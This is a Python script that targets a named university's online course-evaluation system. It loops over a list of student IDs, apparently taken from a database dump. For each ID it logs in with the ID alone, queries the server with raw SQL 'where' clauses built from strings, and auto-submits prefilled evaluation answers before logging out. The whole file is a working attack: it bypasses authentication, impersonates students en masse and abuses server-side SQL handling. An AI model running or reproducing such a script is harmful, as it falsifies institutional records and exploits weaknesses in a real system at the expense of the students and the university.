import requests
import json

opcode = ''
userid = ''
#proxy={'http':'http://127.0.0.1:8080'}
user=[]

user = list(open('/Users/jefferson/Programming/mysqlout/id'))

for userid in user:
    #userid = str(input('ID:'))
    userid=str(userid).strip('\n')
    s = requests.session()
    s.post('http://survey.cycu.edu.tw/sv/login.jsp',data={'idcode':userid})
    tsdata={'cmd':'selectJson','where':'year_term=\'1042\' AND idcode=\''+userid+'\' AND time_filled IS NULL'}
    ssdata={'cmd':'selectJson','where':'time_filled IS NULL AND std_id=\''+userid+'\' AND year_term=\'1042\''}
    msdata={'cmd':'selectJson','where':'time_filled IS NULL AND std_id=\''+userid+'\' AND year_term=\'1042\''}
    #print(payload)
    ts=s.post('http://survey.cycu.edu.tw/sv/ts.srv',data=tsdata)
    ss=s.post('http://survey.cycu.edu.tw/sv/ss.srv',data=ssdata)
    ms=s.post('http://survey.cycu.edu.tw/sv/ms.srv',data=msdata)


    if(ts.json()['datas'])!=None:
        print(userid)
        for x in (ts.json()['datas']):
            tsdata=json.dumps({"1.1":5,"1.2":5,"1.3":5,"1.4":5,"1.5":5,"1.6":5,"1.7":5,"1.8":5,"1.9":5,"2.1":"A","2.2":"D","2.3":"C","2.4":"C","2.5":3,"2.6":3,"2.7":3,"2.8":4,"2.9":4,"3.1":16,"4.1":8,"year_term":"1042","op_code":x['op_code'],"idcode":userid})
            data={'json':tsdata,'cmd':'svDatas'}
            s.post('http://survey.cycu.edu.tw/sv/ts.srv',data=data)
            print(x['op_code'])

    if(ss.json()['datas'])!=None:
        print(userid)
        ssdata=json.dumps({"A01":5,"A02":5,"A03":5,"A04":5,"A05":5,"A06":5,"A07":5,"A08":5,"A09":5,"A10":1,"year_term":"1042","family_no":ss.json()['datas'][0]['family_no'],"std_id":userid})
        data={'json':ssdata,'cmd':'svDatas'}
        s.post('http://survey.cycu.edu.tw/sv/ss.srv',data=data)
        print(ss.json()['datas'][0]['family_no'])

    if(ms.json()['datas'])!=None:
        print(userid)
        msdata=json.dumps({"A01":5,"A02":5,"A03":5,"A04":5,"A05":5,"A06":5,"A07":5,"A08":5,"A09":5,"A10":1,"year_term":"1042","cls_code":ms.json()['datas'][0]['cls_code'],"std_id":userid})
        data={'cmd':'svDatas','json':msdata}
        s.post('http://survey.cycu.edu.tw/sv/ms.srv',data=data)
        print(ms.json()['datas'][0]['cls_code'])
    
    s.post('http://survey.cycu.edu.tw/sv/sso.srv',data={'cmd':'logout'})

"""
    if(ts.json()['datas'])!=None:
        print(userid+'ts')
    if(ss.json()['datas'])!=None:
        print(userid+'ss')
    if(ms.json()['datas'])!=None:
        print(userid+'ms')
    print(userid+'good')

"""
    


